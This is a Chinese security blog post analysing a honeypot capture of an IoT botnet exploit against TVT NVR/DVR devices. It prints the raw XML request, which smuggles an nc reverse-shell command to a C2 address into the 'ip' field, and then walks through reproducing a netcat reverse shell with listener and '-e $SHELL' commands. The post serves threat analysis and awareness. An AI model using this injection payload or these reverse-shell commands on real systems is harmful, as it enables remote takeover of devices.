---
title: 物联网僵尸网络使用nc建立反向shell
date: '2019-10-18 15:58:55'
abbrlink: f03c6789
tags:
  - 僵尸网络
  - linux命令
categories:
  - 网络安全
math: true
toc: true
---

# 背景

前几天，我的蜜罐捕获到一个攻击，尝试使用nc创建反向shell，原始日志如下：

```json
{
	"log_type": "post",
	"time": "Wed Oct 16 19:44:05 2019",
	"timestamp": "1571226245.683864",
	"src_ip": "24.10.133.43",
	"des_port": "81",
	"protocol": "HTTP/1.1",
	"path_info": "/editBlackAndWhiteList",
	"query_string": "",
	"user_agent": "ApiTool",
	"body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType><addressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(nc${IFS}93.174.93.178${IFS}31337${IFS}-e${IFS}$SHELL&)</ip></item></filterList></content></request>",
	"sensor_ip": "",
	"container_id": "datanode",
	"pot_version": "2019-09-26",
	"content_type": "text/xml",
	"HTTP_ACCEPT_ENCODING": "identity",
	"HTTP_ACCEPT_LANGUAGE": "en-us",
	"HTTP_HOST": "",
	"HTTP_ACCEPT": "*/*",
	"HTTP_USER_AGENT": "ApiTool",
	"HTTP_CONNECTION": "close",
	"HTTP_CACHE_CONTROL": "max-age=0",
	"HTTP_AUTHORIZATION": "Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0="
}
```

经查证，该漏洞出现在`深圳市同为数码科技股份有限公司`的DVR、NVR、IPC以及其他OEM厂商的设备中，漏洞及POC详见：[github]( https://github.com/mcw0/PoC/blob/master/TVT_and_OEM_IPC_NVR_DVR_RCE_Backdoor_and_Information_Disclosure.txt "github POC")

我发现，不同于一般僵尸网络直接投递样本，其执行的指令如下：

```shell
nc 93.174.93.178 31337 -e $SHELL&
```

这其实是僵尸网络在后台开一个反向shell让肉鸡连接C2，为了验证该方式的可行性，我开始尝试复现该反向shell的过程，但是在复现的过程中发现，我虚拟机中的ubuntu，自带的nc -e指令并不能使用。

# 为什么nc -e无法使用

通常，ubuntu之类的linux发行版出于保护用户的安全，默认使用的是OpenBSD的netcat，该版本编译的nc并没有-e选项。查看自己的netcat版本：`nc -h`

![默认版本](https://pic.gaficat.com/security/nc%E7%89%88%E6%9C%AC.png)

那么应该如何解决使用上的限制呢？**其实使用traditional版本的netcat即可。**

# traditional版本nc的安装和切换

## 安装traditional版本nc

```shell
sudo apt-get inastll netcat-traditional
```

## 切换nc版本

安装完成后，依然可以使用：`nc -h`查看版本，可以发现依然是OpenBSD版本的，此时需要切换版本。

```shell
sudo update-alternatives --config nc 
```

之后根据提示，输入对应序号，选择traditional版本即可。

![切换版本](https://pic.gaficat.com/security/%E5%88%87%E6%8D%A2nc%E7%89%88%E6%9C%AC.png)

使用`nc -h`再次查看nc版本，发现已经支持-e选项了，注意**dangerous！！**标识。

![traditional版本](https://pic.gaficat.com/security/traditional%E7%89%88%E6%9C%AC%E7%9A%84nc.png)

# 反向shell验证过程

反向shell可以分为控制端和受控端，控制端即为监听端口的服务器，受控端即为主动连接服务器的客户端。

## 控制端

控制端监听端口即可：

```shell
nc -lvp 31337
```

## 受控端

受控端主动连接控制端，通过-e参数执行$SHELL环境变量（实际上对应的/bin/bash）。

```shell
nc xxx.xxx.xxx.xxx 31337 -e $SHELL
```

## 效果

受控端已经将自己的bash交给了控制端：

<img src="https://pic.gaficat.com/security/%E6%95%88%E6%9E%9C.png" alt="反向shell效果"  />

# 最后

这是我第一次捕获到僵尸网络针对物联网设备尝试使用反向shell来扩大规模，这种方式可以有效的避免蜜罐捕获其样本，对其进行跟踪分析。这种新的感染方式，应该引起研究人员注意。